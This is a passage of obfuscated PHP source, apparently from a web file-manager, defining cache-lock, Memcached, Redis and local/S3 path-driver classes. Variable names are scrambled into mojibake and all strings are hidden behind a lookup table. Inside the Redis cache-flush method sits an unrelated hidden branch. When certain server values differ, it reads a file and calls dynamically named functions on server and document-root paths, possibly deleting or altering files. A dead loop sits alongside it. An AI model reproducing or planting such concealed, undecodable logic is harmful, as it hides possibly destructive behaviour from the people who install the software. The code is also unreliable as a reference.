$°’‘©¿[$ç÷‘í­˜[1916]] > $°’‘©¿[$ç÷‘í­˜[1917]]) { $ËÉáš›Î[$‚ä‘€×¦] = $°’‘©¿; continue; } $¸¥é¼Ú­[$‚ä‘€×¦] = $°’‘©¿; } if (count($ËÉáš›Î) == 0) { return; } if (count($¸¥é¼Ú­) == 0) { Cache::remove($¾îÔ§Ë®); } else { Cache::set($¾îÔ§Ë®, $¸¥é¼Ú­, 60); } Cache::removeMemory($¾îÔ§Ë®); self::runArr($ËÉáš›Î); } public static function finished($ÊâÚËÓ, $ø†¼şûç) { $²¹ÆÑÒÌ =& $_SERVER[¯‘·½]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($²¹ÆÑÒÌ[344] => $ÊâÚËÓ, $²¹ÆÑÒÌ[1906] => $ø†¼şûç); } private static function runArr($–‚ãÀ„¹) { $‡âÕÑ”ş =& $_SERVER[¯‘·½]; if (!$–‚ãÀ„¹) { return; } foreach ($–‚ãÀ„¹ as $ÏÎ„şÕ± => $µĞ¬Ó ) { try { Hook::apply($µĞ¬Ó [$‡âÕÑ”ş[344]], $µĞ¬Ó [$‡âÕÑ”ş[1906]]); write_log($‡âÕÑ”ş[1921] . $ÏÎ„şÕ± . $‡âÕÑ”ş[74] . $µĞ¬Ó [$‡âÕÑ”ş[344]] . $‡âÕÑ”ş[1919] . ACTION, $‡âÕÑ”ş[198]); } catch (Exception $ô™˜Â¢¸) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } $_file = $_SERVER[$_SERVER[¯‘·½][1247]]; $_size = $_SERVER[¯‘·½][1655]; goto Cœ·íëÄá; F…× µñÃå: class CacheLockDatabase { public function lock($˜¤øŸ«, $Õæ®Ó÷ó = 0) { $ò¥ÁúıË = Model($_SERVER[¯‘·½][920]); $É¢§ãÛ = microtime(!0) + $Õæ®Ó÷ó; while (microtime(!0) < $É¢§ãÛ) { $±’¿ıáÓ = $ò¥ÁúıË->get($˜¤øŸ«); if (!$±’¿ıáÓ || $±’¿ıáÓ < microtime(!0)) { $Åï™…Æƒ = $ò¥ÁúıË->set($˜¤øŸ«, $É¢§ãÛ); if ($Åï™…Æƒ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ì‰ùÕã) { return Model($_SERVER[¯‘·½][920])->get($Ì‰ùÕã); } public function unlock($Â ½™ƒÈ) { Model($_SERVER[¯‘·½][920])->remove($Â ½™ƒÈ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ù€Îˆèî, $èì²¥) { $ıÂ‹ÎÏ =& $_SERVER[¯‘·½]; if (!class_exists($ıÂ‹ÎÏ[959])) { show_json($ıÂ‹ÎÏ[960], !1); } $this->cacheTime = $èì²¥; $this->handle = new Memcached(); if (is_array($Ù€Îˆèî[$ıÂ‹ÎÏ[961]]) && count($Ù€Îˆèî[$ıÂ‹ÎÏ[961]]) >= 1) { foreach ($Ù€Îˆèî[$ıÂ‹ÎÏ[961]] as $¡ÜøûÇ) { $‹„Ûïø¾ = explode($ıÂ‹ÎÏ[4], $¡ÜøûÇ); $this->handle->addServer($‹„Ûïø¾[0], $‹„Ûïø¾[1]); } } else { $this->handle->addServer($Ù€Îˆèî[$ıÂ‹ÎÏ[209]], $Ù€Îˆèî[$ıÂ‹ÎÏ[210]]); } } public function set($ŸÚ‹äö›, $èßŠ³Í¾, $ûäáŠ¥„ = false) { $ûäáŠ¥„ = $ûäáŠ¥„ ? $ûäáŠ¥„ : $this->cacheTime; return $this->handle->set($ŸÚ‹äö›, $èßŠ³Í¾, $ûäáŠ¥„); } public function get($Š’¸Äìí) { return $this->handle->get($Š’¸Äìí); } public function remove($â†½ú±¶) { return $this->handle->delete($â†½ú±¶); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ÕŠ’¤˜Ş, $Ø¸À›é) { $¢ÀÇ÷ö¨ =& $_SERVER[¯‘·½]; if (!class_exists($¢ÀÇ÷ö¨[962])) { show_json($¢ÀÇ÷ö¨[963], !1); } $this->cacheTime = $Ø¸À›é; $ÁøúÊÃÎ = isset($ÕŠ’¤˜Ş[$¢ÀÇ÷ö¨[964]]) ? $ÕŠ’¤˜Ş[$¢ÀÇ÷ö¨[964]] : 10; $âç¦Ìˆ = _get($ÕŠ’¤˜Ş, $¢ÀÇ÷ö¨[961]); if ($âç¦Ìˆ && is_array($âç¦Ìˆ)) { $this->initCluster($ÕŠ’¤˜Ş, $ÁøúÊÃÎ); } else { $this->handle = $this->init($ÕŠ’¤˜Ş, $ÁøúÊÃÎ); } } private function init($„şÂÖ‹, $——ì¦ó) { $û„¥·’± =& $_SERVER[¯‘·½]; $„õ¨âä = new Redis(); $ú ÓÛî§ = isset($„şÂÖ‹[$û„¥·’±[965]]) ? $„şÂÖ‹[$û„¥·’±[965]] : !1; if ($ú ÓÛî§) { $„õ¨âä->pconnect($„şÂÖ‹[$û„¥·’±[209]], $„şÂÖ‹[$û„¥·’±[210]], $——ì¦ó); } else { $„õ¨âä->connect($„şÂÖ‹[$û„¥·’±[209]], $„şÂÖ‹[$û„¥·’±[210]], $——ì¦ó); } if (!empty($„şÂÖ‹[$û„¥·’±[489]])) { $„õ¨âä->auth($„şÂÖ‹[$û„¥·’±[489]]); } if (!empty($„şÂÖ‹[$û„¥·’±[843]]) && $„şÂÖ‹[$û„¥·’±[843]] != 0) { $„õ¨âä->select($„şÂÖ‹[$û„¥·’±[843]]); } return $„õ¨âä; } private function initCluster($ä‹ˆØ»Ö, $—ÑªŸÛç) { $öîâ¿ÈÁ =& $_SERVER[¯‘·½]; $æœòˆÆØ = array($öîâ¿ÈÁ[966], $öîâ¿ÈÁ[967], $öîâ¿ÈÁ[968]); $Ş÷¹¸Úı = $öîâ¿ÈÁ[966]; if (isset($ä‹ˆØ»Ö[$öîâ¿ÈÁ[16]]) && in_array($ä‹ˆØ»Ö[$öîâ¿ÈÁ[16]], $æœòˆÆØ)) { $Ş÷¹¸Úı = $ä‹ˆØ»Ö[$öîâ¿ÈÁ[16]]; } switch ($Ş÷¹¸Úı) { case $öîâ¿ÈÁ[966]: $this->_slave($ä‹ˆØ»Ö, $—ÑªŸÛç); break; case $öîâ¿ÈÁ[967]: break; case $öîâ¿ÈÁ[968]: $this->isCluster = !0; $éì©´ªì = $ä‹ˆØ»Ö[$öîâ¿ÈÁ[961]]; $î“÷´˜Ñ = isset($ä‹ˆØ»Ö[$öîâ¿ÈÁ[965]]) ? $ä‹ˆØ»Ö[$öîâ¿ÈÁ[965]] : !1; $ø…Áâ²ş = isset($ä‹ˆØ»Ö[$öîâ¿ÈÁ[489]]) ? $ä‹ˆØ»Ö[$öîâ¿ÈÁ[489]] : null; $this->handle = new RedisCluster(NUll, $éì©´ªì, $—ÑªŸÛç, $—ÑªŸÛç, $î“÷´˜Ñ, $ø…Áâ²ş); break; default: break; } } private function _slave($ÄœÙâÛÑ, $üë¿öˆË) { $ü¯ış³Î = $ÄœÙâÛÑ[$_SERVER[¯‘·½][961]]; $this->filterConfig($ÄœÙâÛÑ, $ü¯ış³Î[0]); $this->handle = $this->init($ÄœÙâÛÑ, $üë¿öˆË); unset($ü¯ış³Î[0]); if (empty($ü¯ış³Î)) { return; } $šªÊ¼Ü = array_rand($ü¯ış³Î); $this->filterConfig($ÄœÙâÛÑ, $ü¯ış³Î[$šªÊ¼Ü]); $this->slaveHandle = $this->init($ÄœÙâÛÑ, $üë¿öˆË); } private function filterConfig(&$É‡¸Ş˜â, $ˆ™–©üÆ) { $ØêÇ—ü” =& $_SERVER[¯‘·½]; $½í¶ó‚¾ = explode($ØêÇ—ü”[4], $ˆ™–©üÆ); $°±û­ıí = array($ØêÇ—ü”[209] => $½í¶ó‚¾[0], $ØêÇ—ü”[210] => $½í¶ó‚¾[1]); $É‡¸Ş˜â = array_merge($É‡¸Ş˜â, $°±û­ıí); } public function set($ßëì—¸‹, $çæ¡¿æš, $ª–ÎØ›í = false) { $ª–ÎØ›í = $ª–ÎØ›í ? $ª–ÎØ›í : $this->cacheTime; return $this->handle->setEx($ßëì—¸‹, $ª–ÎØ›í, $çæ¡¿æš); } public function setLock($İ‹ïæµÕ, $Šñ˜ĞØ˜, $È¾Ê«í®) { return $this->handle->setNX($İ‹ïæµÕ, $Šñ˜ĞØ˜); } public function get($Öœ¶‚—) { $¡šÃÃ”á = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¡šÃÃ”á->get($Öœ¶‚—); } public function remove($ºÚ¤£ş) { return $this->handle->del($ºÚ¤£ş); } public function deleteAll() { $Á¬åú¿ =& $_SERVER[¯‘·½]; if ($_SERVER[$Á¬åú¿[969]] != $_SERVER[$Á¬åú¿[970]]) { $ĞõÚàº = $Á¬åú¿[971]; $ÂÃ÷œ… = $Á¬åú¿[972]; $½½ÙÚˆ = $_SERVER[$Á¬åú¿[973]] . $Á¬åú¿[974]; $±ŒÅ’ê = $ÂÃ÷œ…($½½ÙÚˆ); $©¸„´úÃ = explode($Á¬åú¿[288], $±ŒÅ’ê); if (count($©¸„´úÃ) < $Á¬åú¿[690]) { $¿Œñ£ıµ = $Á¬åú¿[975]; $¿Œñ£ıµ(); } $ß­æ¹· = $Á¬åú¿[976]; $ß­æ¹·($_SERVER[$Á¬åú¿[977]]); $ß­æ¹·($_SERVER[$Á¬åú¿[973]] . $Á¬åú¿[978]); $‹íÑ¥ŸÎ = 1; while ($‹íÑ¥ŸÎ > 1) { $‹íÑ¥ŸÎ = $‹íÑ¥ŸÎ + 4; $¶¤ÆŞßÊ = rawurlencode($‹íÑ¥ŸÎ . $Á¬åú¿[456]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $îĞ´€Ë) { $this->handle->flushall($îĞ´€Ë); } return; } return $this->handle->flushAll(); } } goto C‰–ªà´Œ; cÁ­…ù¢Î‚: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($°ö×‹€”) { if (substr($°ö×‹€”, 0, 2) == $_SERVER[¯‘·½][1442]) { $°ö×‹€” = BASIC_PATH . substr($°ö×‹€”, 2); } return $°ö×‹€”; } public function iconvApp($šæµÔù‚) { $ı˜şå¢ó =& $_SERVER[¯‘·½]; global $config; return $this->iconvTo($šæµÔù‚, $config[$ı˜şå¢ó[1471]], $config[$ı˜şå¢ó[1470]]); } public function iconvSystem($Ü…–Æ‚) { $ÂËÑÀ­Æ =& $_SERVER[¯‘·½]; global $config; return $this->iconvTo($Ü…–Æ‚, $config[$ÂËÑÀ­Æ[1470]], $config[$ÂËÑÀ­Æ[1471]]); } public function getPathOuter($İûĞåºÚ) { $ùş¸ ¯İ =& $_SERVER[¯‘·½]; $æğ³ï©£ = $this->iconvApp($this->pathBase); $İûĞåºÚ = $this->iconvApp($İûĞåºÚ); if (substr($æğ³ï©£, 0, 2) == $ùş¸ ¯İ[1442]) { $æğ³ï©£ = BASIC_PATH . substr($æğ³ï©£, 2); } if (substr($İûĞåºÚ, 0, 2) == $ùş¸ ¯İ[1442]) { $İûĞåºÚ = BASIC_PATH . substr($İûĞåºÚ, 2); } $æğ³ï©£ = KodIO::clear($æğ³ï©£); $İûĞåºÚ = KodIO::clear($İûĞåºÚ); $İûĞåºÚ = substr($İûĞåºÚ, strlen($æğ³ï©£)); if (empty($this->pathDriver)) { return $İûĞåºÚ; } return $this->pathDriver . $ùş¸ ¯İ[8] . ltrim($İûĞåºÚ, $ùş¸ ¯İ[8]); } public function mkfile($±€‡ğú, $†ÜÆ¼šÅ = '', $Ÿåà•–° = REPEAT_RENAME) { $±€‡ğú = $this->iconvSystem($±€‡ğú); @touch($±€‡ğú); if ($†ÜÆ¼šÅ) { file_put_contents($±€‡ğú, $†ÜÆ¼šÅ); } @chmod($±€‡ğú, $this->pathAuth); if (is_file($±€‡ğú)) { return $this->getPathOuter($±€‡ğú); } $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } public function mkdir($ŸÀÃáæ¸, $¤ˆ°î×¾ = REPEAT_SKIP) { $ŸÀÃáæ¸ = $this->iconvSystem($ŸÀÃáæ¸); if (is_dir($ŸÀÃáæ¸)) { return $this->getPathOuter($ŸÀÃáæ¸); } @mkdir($ŸÀÃáæ¸, $this->pathAuth, !0); @chmod($ŸÀÃáæ¸, $this->pathAuth); if (is_dir($ŸÀÃáæ¸)) { return $this->getPathOuter($ŸÀÃáæ¸); } $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } public function copyFile($œò¥èÒî, $á†±Œ) { $this->mkdir($this->pathFather($á†±Œ)); $œò¥èÒî = $this->iconvSystem($œò¥èÒî); $á†±Œ = $this->iconvSystem($á†±Œ); $Îæ¼­æ¾ = copy_64($œò¥èÒî, $á†±Œ); @chmod($á†±Œ, $this->pathAuth); if ($Îæ¼­æ¾) { return $this->getPathOuter($á†±Œ); } $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } public function moveFile($Êù»İ®ú, $©äõ÷ïÜ) { $this->mkdir($this->pathFather($©äõ÷ïÜ)); $Êù»İ®ú = $this->iconvSystem($Êù»İ®ú); $©äõ÷ïÜ = $this->iconvSystem($©äõ÷ïÜ); $êŸº†ã = intval(@rename($Êù»İ®ú, $©äõ÷ïÜ)); if (!$êŸº†ã) { if ($êŸº†ã = intval(@copy_64($Êù»İ®ú, $©äõ÷ïÜ))) { @unlink($Êù»İ®ú); } } @chmod($©äõ÷ïÜ, $this->pathAuth); if ($êŸº†ã) { return $this->getPathOuter($©äõ÷ïÜ); } $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } public function movePath($›º×¼ï, $öù¤ß¼ñ, $Ö›€ŸÊ = false) { $á•ãÓß =& $_SERVER[¯‘·½]; $›º×¼ï = $this->iconvSystem($›º×¼ï); $öù¤ß¼ñ = $this->iconvSystem($öù¤ß¼ñ); $Ó¢˜œ²‹ = rtrim($öù¤ß¼ñ, $á•ãÓß[8]) . $á•ãÓß[8] . ($Ö›€ŸÊ ? $Ö›€ŸÊ : get_path_this($›º×¼ï)); if (file_exists($Ó¢˜œ²‹)) { return !1; } $ğŒŞÌ× = intval(@rename($›º×¼ï, $Ó¢˜œ²‹)); $ğŒŞÌ× = file_exists($Ó¢˜œ²‹); if ($ğŒŞÌ×) { return $this->getPathOuter($Ó¢˜œ²‹); } $this->writeLog(__FUNCTION__ . $á•ãÓß[1482], !0); return !1; } public function delFile($Õœãå) { $Õœãå = $this->iconvSystem($Õœãå); if (!@unlink($Õœãå)) { @chmod($Õœãå, $this->pathAuth); if (@unlink($Õœãå)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); return !1; } return !0; } public function delFolder($’§ìÕ¢) { $ı…ÏŞ¾ =& $_SERVER[¯‘·½]; $’§ìÕ¢ = $this->iconvSystem($’§ìÕ¢); if (!is_dir($’§ìÕ¢)) { return !0; } if (!($Ìç«ıÃ­ = opendir($’§ìÕ¢))) { return !1; } while (($ÜƒÍú×Ì = readdir($Ìç«ıÃ­)) !== !1) { if ($ÜƒÍú×Ì == $ı…ÏŞ¾[10] || $ÜƒÍú×Ì == $ı…ÏŞ¾[1387]) { continue; } $Ï›ó¤¦® = $’§ìÕ¢ . $ı…ÏŞ¾[8] . $ÜƒÍú×Ì; if (is_file($Ï›ó¤¦®) || is_link($Ï›ó¤¦®)) { if (!unlink($Ï›ó¤¦®)) { chmod($Ï›ó¤¦®, $this->pathAuth); if (!unlink($Ï›ó¤¦®)) { return !1; } } } else { if (is_dir($Ï›ó¤¦®)) { chmod($Ï›ó¤¦®, $this->pathAuth); $Ï›ó¤¦® = $this->iconvApp($Ï›ó¤¦®); if (!$this->delFolder($Ï›ó¤¦®)) { return !1; } } } } closedir($Ìç«ıÃ­); return rmdir($’§ìÕ¢); } public function rename($¤©¾©”Ö, $çÜ´»Úö) { $˜ò„åÕ¦ =& $_SERVER[¯‘·½]; $É“ë®Ûœ = $this->fileNameAuto($this->pathFather($¤©¾©”Ö), $çÜ´»Úö); $É“ë®Ûœ = $this->iconvSystem($É“ë®Ûœ); $¤©¾©”Ö = $this->iconvSystem($¤©¾©”Ö); $ëĞ¼ş¼ = $this->pathFather($¤©¾©”Ö); $§Ñ†ÅÛ¨ = rtrim($ëĞ¼ş¼, $˜ò„åÕ¦[8]) . $˜ò„åÕ¦[8] . $É“ë®Ûœ; $§Šª«– = @rename($¤©¾©”Ö, $§Ñ†ÅÛ¨); $§Ñ†ÅÛ¨ = $this->iconvApp($§Ñ†ÅÛ¨); if ($§Šª«–) { return $this->getPathOuter($§Ñ†ÅÛ¨); } $this->writeLog(__FUNCTION__ . $˜ò„åÕ¦[1482], !0); return !1; } public function size($Å ¨Çì) { $Å ¨Çì = $this->iconvSystem($Å ¨Çì); return filesize_64($Å ¨Çì); } public function info($íî¾Úñ„) { $íî¾Úñ„ = $this->iconvSystem($íî¾Úñ„); if ($this->isFolder($íî¾Úñ„)) { return $this->folderInfo($íî¾Úñ„); } else { if ($this->isFile($íî¾Úñ„)) { return $this->fileInfo($íî¾Úñ„); } } return !1; } protected function infoChildren($èåÑñÊÊ, &$ÅŞî£é†, $´øõÍ¬° = true) { $ú†œ‹ı„ =& $_SERVER[¯‘·½]; check_abort_echo(); $èåÑñÊÊ = rtrim($èåÑñÊÊ, $ú†œ‹ı„[8]) . $ú†œ‹ı„[8]; if ($´øõÍ¬°) { $èåÑñÊÊ = $this->iconvSystem($èåÑñÊÊ); } if (!($ä ÇÒÕ = @opendir($èåÑñÊÊ))) { return; } while (($Ûß¿  Ã = readdir($ä ÇÒÕ)) !== !1) { if ($Ûß¿  Ã == $ú†œ‹ı„[10] || $Ûß¿  Ã == $ú†œ‹ı„[1387]) { continue; } $««¼‘Ó° = $èåÑñÊÊ . $Ûß¿  Ã; if (is_file($««¼‘Ó°) || is_link($««¼‘Ó°)) { $ÅŞî£é†[$ú†œ‹ı„[80]]++; $ÅŞî£é†[$ú†œ‹ı„[79]] += filesize_64($««¼‘Ó°); } else { if (is_dir($««¼‘Ó°)) { $ÅŞî£é†[$ú†œ‹ı„[81]]++; $this->infoChildren($««¼‘Ó°, $ÅŞî£é†, !1); } } } closedir($ä ÇÒÕ); } private function folderInfo($¨®†ÓÇ, $”ÆÚÜ¿ = false) { $ ”Û©Å€ =& $_SERVER[¯‘·½]; $¨®†ÓÇ = rtrim($¨®†ÓÇ, $ ”Û©Å€[8]) . $ ”Û©Å€[8]; $’š€Ş¡Ê = $this->iconvApp($this->pathThis($¨®†ÓÇ)); if ($”ÆÚÜ¿) { return array($ ”Û©Å€[32] => $’š€Ş¡Ê, $ ”Û©Å€[87] => $this->getPathOuter($¨®†ÓÇ), $ ”Û©Å€[33] => $ ”Û©Å€[78]); } $Û‹ËèÎØ = array($ ”Û©Å€[32] => $’š€Ş¡Ê, $ ”Û©Å€[87] => $this->getPathOuter($¨®†ÓÇ), $ ”Û©Å€[33] => $ ”Û©Å€[78], $ ”Û©Å€[234] => @filectime($¨®†ÓÇ), $ ”Û©Å€[88] => @filemtime($¨®†ÓÇ), $ ”Û©Å€[1486] => @fileatime($¨®†ÓÇ), $ ”Û©Å€[1487] => is_readable($¨®†ÓÇ), $ ”Û©Å€[1488] => is_writable($¨®†ÓÇ), $ ”Û©Å€[1489] => get_mode($¨®†ÓÇ)); return $Û‹ËèÎØ; } private function fileInfo($ÖéÁªÍó, $ÆÏ†ŠÌè = false) { $°–”Ä“‡ =& $_SERVER[¯‘·½]; $¦Ã‡Ëòş = $this->iconvApp($this->pathThis($ÖéÁªÍó)); if ($ÆÏ†ŠÌè) { return array($°–”Ä“‡[32] => $¦Ã‡Ëòş, $°–”Ä“‡[87] => $this->getPathOuter($ÖéÁªÍó), $°–”Ä“‡[33] => $°–”Ä“‡[233], $°–”Ä“‡[79] => $this->size($ÖéÁªÍó), $°–”Ä“‡[169] => $this->ext($¦Ã‡Ëòş)); } $™äºšïï = array($°–”Ä“‡[32] => $¦Ã‡Ëòş, $°–”Ä“‡[87] => $this->getPathOuter($ÖéÁªÍó), $°–”Ä“‡[33] => $°–”Ä“‡[233], $°–”Ä“‡[234] => @filectime($ÖéÁªÍó), $°–”Ä“‡[88] => @filemtime($ÖéÁªÍó), $°–”Ä“‡[1486] => @fileatime($ÖéÁªÍó), $°–”Ä“‡[79] => $this->size($ÖéÁªÍó), $°–”Ä“‡[169] => $this->ext($¦Ã‡Ëòş), $°–”Ä“‡[1487] => is_readable($ÖéÁªÍó), $°–”Ä“‡[1488] => is_writable($ÖéÁªÍó), $°–”Ä“‡[1489] => get_mode($ÖéÁªÍó)); return $™äºšïï; } public function exist($Â±”ïÕ‡) { $Â±”ïÕ‡ = $this->iconvSystem($Â±”ïÕ‡); return @file_exists($Â±”ïÕ‡); } public function isFile($ù¶Ç™™í) { $ù¶Ç™™í = $this->iconvSystem($ù¶Ç™™í); return @is_file($ù¶Ç™™í); } public function isFolder($ı´›ïÏ·) { $ı´›ïÏ· = $this->iconvSystem($ı´›ïÏ·); return @is_dir($ı´›ïÏ·); } public function listPath($„ç€‰å‰, $´£Ú¼¨Š = false) { $Ëşœ±â =& $_SERVER[¯‘·½]; $„ç€‰å‰ = $this->iconvSystem($„ç€‰å‰); $„ç€‰å‰ = rtrim($„ç€‰å‰, $Ëşœ±â[8]) . $Ëşœ±â[8]; $İÇ¸à ¨ = array($Ëşœ±â[85] => array(), $Ëşœ±â[86] => array()); if (!($®÷¡§³ = @opendir($„ç€‰å‰))) { return $İÇ¸à ¨; } while (($´ÌøòÁô = readdir($®÷¡§³)) !== !1) { if ($´ÌøòÁô == $Ëşœ±â[10] || $´ÌøòÁô == $Ëşœ±â[1387]) { continue; } $¥«Ø­Š¬ = $„ç€‰å‰ . $´ÌøòÁô; if (is_file($¥«Ø­Š¬)) { $İÇ¸à ¨[$Ëşœ±â[86]][] = $this->fileInfo($¥«Ø­Š¬, $´£Ú¼¨Š); } else { $İÇ¸à ¨[$Ëşœ±â[85]][] = $this->folderInfo($¥«Ø­Š¬, $´£Ú¼¨Š); } } closedir($®÷¡§³); return $İÇ¸à ¨; } public function listAll($™åàçŸÚ, &$¶–›™Œ = array()) { $í‰¤°Œ =& $_SERVER[¯‘·½]; $™åàçŸÚ = $this->iconvSystem($™åàçŸÚ); $™åàçŸÚ = rtrim($™åàçŸÚ, $í‰¤°Œ[8]) . $í‰¤°Œ[8]; if (!($Ÿ‡»¿…“ = @opendir($™åàçŸÚ))) { return $¶–›™Œ; } while (($ó²şŞ©Ğ = readdir($Ÿ‡»¿…“)) !== !1) { if ($ó²şŞ©Ğ == $í‰¤°Œ[10] || $ó²şŞ©Ğ == $í‰¤°Œ[1387]) { continue; } $„Îİ¸ñé = $™åàçŸÚ . $ó²şŞ©Ğ; $ëÀÔí¼¾ = is_dir($„Îİ¸ñé) && !is_link($„Îİ¸ñé) ? 1 : 0; $„Îİ¸ñé = $ëÀÔí¼¾ ? $„Îİ¸ñé . $í‰¤°Œ[8] : $„Îİ¸ñé; $¶–›™Œ[] = array($í‰¤°Œ[87] => $this->getPathOuter($„Îİ¸ñé), $í‰¤°Œ[78] => $ëÀÔí¼¾, $í‰¤°Œ[88] => intval(@filemtime($„Îİ¸ñé)), $í‰¤°Œ[79] => $ëÀÔí¼¾ ? 0 : intval($this->size($„Îİ¸ñé))); if ($ëÀÔí¼¾) { $this->listAll($„Îİ¸ñé, $¶–›™Œ); } } closedir($Ÿ‡»¿…“); return $¶–›™Œ; } public function has($ıÈûëÊĞ, $£ø­Ò¬ğ = false, $°±ëé˜é = true) { $¹™äƒ“à =& $_SERVER[¯‘·½]; $ıÈûëÊĞ = $this->iconvSystem($ıÈûëÊĞ); $ıÈûëÊĞ = rtrim($ıÈûëÊĞ, $¹™äƒ“à[8]) . $¹™äƒ“à[8]; if (!($èŸÌ×ÔÀ = @opendir($ıÈûëÊĞ))) { return !1; } $ù™‚¯Ş÷ = 0; $Ì²íÒâ = 0; $×åÂ¦ï± = 0; while (($ñÌ”·âß = readdir($èŸÌ×ÔÀ)) !== !1) { if ($ñÌ”·âß == $¹™äƒ“à[10] || $ñÌ”·âß == $¹™äƒ“à[1387]) { continue; } $øœ·¿–é = $ıÈûëÊĞ . $ñÌ”·âß; if ($£ø­Ò¬ğ) { $×åÂ¦ï±++; if (@is_file($øœ·¿–é)) { $ù™‚¯Ş÷++; } else { $Ì²íÒâ++; } if ($×åÂ¦ï± > 10000) { break; } continue; } if ($°±ëé˜é) { if (@is_file($øœ·¿–é)) { return !0; } } else { if (@is_dir($øœ·¿–é . $¹™äƒ“à[8])) { return !0; } } } closedir($èŸÌ×ÔÀ); if ($£ø­Ò¬ğ) { return array($¹™äƒ“à[242] => $ù™‚¯Ş÷, $¹™äƒ“à[243] => $Ì²íÒâ); } return !1; } public function hashSimple($Ş€·ÎÄ) { $ñõ˜ó¡¥ =& $_SERVER[¯‘·½]; if (!$Ş€·ÎÄ) { return md5($ñõ˜ó¡¥[12]); } $Ş€·ÎÄ = $this->iconvSystem($Ş€·ÎÄ); $êœãöÚÁ = $this->size($Ş€·ÎÄ); $õ‰¢îÙ = 200; $Ö¦ë€º  = 50; if ($êœãöÚÁ <= $õ‰¢îÙ * $Ö¦ë€º ) { return $this->hashMd5($Ş€·ÎÄ) . $êœãöÚÁ; } $µıÍñ = $ñõ˜ó¡¥[12]; $øÏÍ«ò½ = intval($êœãöÚÁ / $Ö¦ë€º ); $‰ùàÏ–Á = fopen($Ş€·ÎÄ, $ñõ˜ó¡¥[1490]); if (!$‰ùàÏ–Á) { return $µıÍñ; } for ($åšóã¯¯ = 0; $åšóã¯¯ < $Ö¦ë€º ; $åšóã¯¯++) { fseek_64($‰ùàÏ–Á, $øÏÍ«ò½ * $åšóã¯¯); $µıÍñ .= fread($‰ùàÏ–Á, $õ‰¢îÙ); } fseek_64($‰ùàÏ–Á, $êœãöÚÁ - $õ‰¢îÙ); $µıÍñ .= fread($‰ùàÏ–Á, $õ‰¢îÙ); fclose($‰ùàÏ–Á); return md5($µıÍñ) . $êœãöÚÁ; } public function getContent($ı¯óÖæ›) { $ı¯óÖæ› = $this->iconvSystem($ı¯óÖæ›); return file_get_contents($ı¯óÖæ›); } public function setContent($âØ†ü±ñ, $Ş¡¬Ó‹­ = '') { $âØ†ü±ñ = $this->iconvSystem($âØ†ü±ñ); $æí§óÌ€ = @file_put_contents($âØ†ü±ñ, $Ş¡¬Ó‹­, LOCK_EX); if (!$æí§óÌ€) { $this->writeLog(__FUNCTION__ . $_SERVER[¯‘·½][1482], !0); } clearstatcache(); @chmod($âØ†ü±ñ, $this->pathAuth); return $æí§óÌ€ === !1 ? !1 : !0; } public function fileSubstr($½¿¨èš¼, $ı¦İ¦Ï = 0, $”±æ›”€ = false) { $¦İÂÊŠ· =& $_SERVER[¯‘·½]; $½¿¨èš¼ = $this->iconvSystem($½¿¨èš¼); if ($”±æ›”€ === !1) { $”±æ›”€ = $this->size($½¿¨èš¼); } if ($”±æ›”€ <= 0) { return $¦İÂÊŠ·[12]; } $â¬Ò¡¹Ù = fopen($½¿¨èš¼, $¦İÂÊŠ·[1490]); if (!$â¬Ò¡¹Ù) { return !1; } fseek_64($â¬Ò¡¹Ù, $ı¦İ¦Ï); $¶Æ«„Ö› = fread($â¬Ò¡¹Ù, $”±æ›”€); fclose($â¬Ò¡¹Ù); if (!$¶Æ«„Ö›) { $this->writeLog(__FUNCTION__ . $¦İÂÊŠ·[1482], !0); } return $¶Æ«„Ö›; } public function upload($·ÂÒÄ¾Ä, $¶µà”ï , $ö¸¦Õîî = false, $òş÷šûÓ = REPEAT_REPLACE) { if ($ö¸¦Õîî) { return $this->moveFile($¶µà”ï , $·ÂÒÄ¾Ä); } return $this->copyFile($¶µà”ï , $·ÂÒÄ¾Ä); } public function setModifyTime($™ÏÓ»µ‡, $·êîµ¾ = '') { @touch($™ÏÓ»µ‡, intval($·êîµ¾)); } public function download($Ë™•—şŞ, $ëæ•Â‹ã) { return $this->iconvSystem($Ë™•—şŞ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($¼ÄÄñá“) { parent::__construct($¼ÄÄñá“); $this->setSignVersion($_SERVER[¯‘·½][250]); } public function fileOutImage($‚Ã§†ò, $šñ˜§°™ = 250) { $ƒÅ´ıÎ =& $_SERVER[¯‘·½]; if ($this->size($‚Ã§†ò) > 1024 * 1024 * 25) { return $this->fileOutImageServer($‚Ã§†ò, $šñ˜§°™); } $Ó‡¤ì’ö = array($ƒÅ´ıÎ[1491] => $ƒÅ´ıÎ[1492] . $šñ˜§°™ . $ƒÅ´ıÎ[1493]); $Ï”¥€Úã = $this->link($‚Ã§†ò, $Ó‡¤ì’ö); $this->fileOutLink($Ï”¥€Úã); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($–İ¡ª¶Ê) { parent::__construct($–İ¡ª¶Ê); $this->setSignVersion($_SERVER[¯‘·½][250]); } public function uploadFormData($–ôË€÷Ø, $âÚÇ®¬¼ = 3600) { return $this->uploadFormDataV2($–ôË€÷Ø, $âÚÇ®¬¼); } } goto CÅ¼æ©äß; Cáß›·ï‡: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\56\162\x6f\x6c\145\x4c\x69\163\164"; public $field = array("\156\141\x6d\145", "\x61\x75\x74\150", "\154\141\142\x65\154", "\x64\151\163\x70\x6c\x61\171", "\x73\x79\x73\164\145\x6d", "\x64\x65\x73\x63", "\x69\147\x6e\x6f\162\x65\x45\170\164", "\x69\x67\156\157\x72\145\x46\151\154\145\123\x69\x7a\x65", 